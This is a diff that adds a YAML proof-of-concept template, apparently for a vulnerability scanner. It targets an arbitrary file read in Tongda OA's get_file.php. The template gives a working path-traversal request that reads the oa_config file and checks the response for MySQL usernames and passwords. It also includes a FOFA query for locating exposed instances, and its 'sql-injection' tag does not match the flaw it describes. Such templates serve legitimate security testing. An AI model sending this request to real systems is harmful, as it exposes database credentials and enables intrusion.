@@ -1,0 +1,23 @@
+id: poc-yaml-tong-da-oa-get-file-php-anyfile-read
+info:
+  name: 通达OA get_file.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 通达OA
+  fofa: app="TDXK-通达OA" && icon_hash="-99198135"
+requests:
+- method: GET
+  path: /module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config
+  expression: 'status_code == 200
+
+    && contains(body,"MYSQL_USER=")
+
+    && contains(body,"MYSQL_PASS=")
+
+    && contains(body,"<?")
+
+    '
+variables: {}
+transport: http
